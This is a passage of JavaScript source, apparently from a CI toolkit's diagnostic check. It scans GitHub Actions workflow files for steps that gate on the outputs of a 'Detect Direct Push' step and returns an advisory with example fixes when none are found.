    // (`echo "should_force_build=true" >> $GITHUB_OUTPUT`) and gates internal steps on
    // `cache.outputs.skip` — neither is consumer composition. So we look for the READ form,
    // on uncommented lines only (the shipped `bkit-stub:e2e` block reads the outputs but is
    // commented out by default — enabling it correctly counts as composition).
    // bkit-ci.yml is the consumer's file, so matching the read form is what distinguishes a
    // consumer gate.
    const readTokens = [
        "steps.detect.outputs.should_force_build",
        "steps.detect.outputs.should_run_full",
    ];
    const composesRunLevels = (content) => content
        .split("\n")
        .some((line) => !/^\s*#/.test(line) && readTokens.some((tok) => line.includes(tok)));
    let composed = false;
    // Any sibling workflow that gates on the outputs.
    for (const entry of fs.readdirSync(workflowsDir, { withFileTypes: true })) {
        if (!entry.isFile() || !/\.ya?ml$/.test(entry.name))
            continue;
        if (entry.name === "bkit-ci.yml")
            continue; // checked below
        if (composesRunLevels(fs.readFileSync(path.join(workflowsDir, entry.name), "utf-8"))) {
            composed = true;
            break;
        }
    }
    // Or a consumer-added gate inside bkit-ci.yml itself (e.g. an enabled bkit-stub:e2e block,
    // or a deploy/job step reading the outputs).
    if (!composed && composesRunLevels(ciContent))
        composed = true;
    if (composed)
        return null;
    return {
        id: "run-levels-not-composed",
        severity: "advisory",
        detect: ".github/workflows/bkit-ci.yml ships bkit's `Detect Direct Push` step outputs (`should_force_build`, `should_run_full`, `cache.outputs.skip`) but no consumer-side workflow or step gates on them.",
        action: "`docs/deployments.md` documents bkit's none / partial / full run-level shape — the matrix is documentation-only until you compose at least one consumer-side gate. Examples:\n\n" +
            "  - A deploy job: `if: steps.detect.outputs.should_force_build == 'true' || github.ref == 'refs/heads/main'`\n" +
            "  - An E2E job: enable the `bkit-stub:e2e` block (which already gates on `should_run_full`).\n" +
            "  - A smoke workflow: copy the `bkit-stub:smoke` block to `.github/workflows/smoke.yml`.\n\n" +
            "If your consumer doesn't need run-level tiers (single-track CI, no preview deploys), dismiss by removing the `Detect Direct Push` step from bkit-ci.yml. Note this also disables `[force cache]` / `[force build]` / `[force full]` tag detection.",
    };
}
